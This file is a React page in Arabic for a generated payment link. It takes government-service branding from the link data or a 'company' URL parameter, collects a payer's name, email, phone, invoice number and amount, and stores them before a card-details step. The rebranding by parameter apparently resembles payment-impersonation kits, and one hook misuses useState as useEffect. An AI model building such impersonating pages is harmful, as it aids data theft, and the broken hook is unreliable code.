import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';

  const serviceName = "دفع فاتورة";
  const paymentInfo = linkData?.payload as any;

  // Get country from link data
  const countryCode = paymentInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  // Get service branding for unified design
  const branding = getServiceBranding(serviceKey);
  const colors = {
    primary: branding.colors?.primary || "#CE1126",
    secondary: branding.colors?.secondary || "#00732F",
    accent: branding.colors?.accent || "#000000",
    background: branding.colors?.background || "#FFFFFF",
    surface: branding.colors?.surface || "#F5F5F5",
    border: branding.colors?.border || "#E0E0E0",
    text: branding.colors?.text || "#000000",
    textLight: branding.colors?.textLight || "#666666",
    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
  };

  // Get government services for the country
  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  // Get selected government service details
  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  // Get amount from link data
  const rawAmount = paymentInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Set initial payment amount from link data
  useState(() => {
    if (amount && !paymentAmount) {
      setPaymentAmount(amount.toString());
    }
  }, [amount, paymentAmount]);

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    // Update link with payment data
    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          invoice_number: invoiceNumber,
          selected_service: selectedService,
          selected_service_name: selectedServiceData?.nameAr || selectedService,
          payment_amount: parseFloat(paymentAmount) || amount,
        },
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      // Navigate to payment details
      navigate(`/pay/${id}/details`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formatCurrency(amount, countryCode)}
        title="دفع فاتورة - إكمال البيانات"
        description="قم بإكمال بيانات السداد لدفع الفاتورة"
      />
      <div className="min-h-screen bg-background" dir="rtl">
        {/* Hero Section */}
        <div
          className="relative w-full h-48 sm:h-64 overflow-hidden"
          style={{
            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
          }}
        >
          <div className="absolute inset-0 bg-black/30" />
          
          {/* Logo Overlay */}
          {branding.logo && (
            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            </div>
          )}
          
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: colors.primary }}>
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h1 className="text-xl sm:text-3xl font-bold">إكمال بيانات السداد</h1>

                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                    style={{
                      background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
                    }}
                  >
                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                  </div>
                </div>

                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  {/* Customer Name */}
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>

                  {/* Customer Email */}
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                      البريد الإلكتروني *
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="example@email.com"
                    />
                  </div>

                  {/* Customer Phone */}
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                      رقم الهاتف *
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                    />
                  </div>

                  {/* Invoice Number */}
                  <div>
                    <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
                      الرقم المفوتر *
                    </Label>
                    <Input
                      id="invoice"
                      value={invoiceNumber}
                      onChange={(e) => setInvoiceNumber(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="مثال: INV-12345"
                    />
                  </div>

                  {/* Government Service Selection */}
                  <div>
                    <Label className="mb-2 text-sm">الخدمة الحكومية/العامة *</Label>
                    <Select value={selectedService} onValueChange={setSelectedService}>
                      <SelectTrigger className="h-10">
                        <SelectValue placeholder="اختر الخدمة" />
                      </SelectTrigger>
                      <SelectContent className="bg-background z-50">
                        {governmentServices.map((service) => (
                          <SelectItem key={service.id} value={service.key}>
                            {service.nameAr}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    {selectedServiceData && (
                      <p className="text-xs text-muted-foreground mt-1">
                        {selectedServiceData.description}
                      </p>
                    )}
                  </div>

                  {/* Payment Amount */}
                  <div>
                    <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
                      مبلغ السداد *
                    </Label>
                    <Input
                      id="amount"
                      type="number"
                      value={paymentAmount}
                      onChange={(e) => setPaymentAmount(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                      step="0.01"
                      min="0"
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
                    </p>
                  </div>
                </div>

                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white hover:opacity-90 transition-all"
                  style={{
                    background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
                    borderRadius: '12px',
                    boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
                  }}
                  disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                </Button>

                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentData;
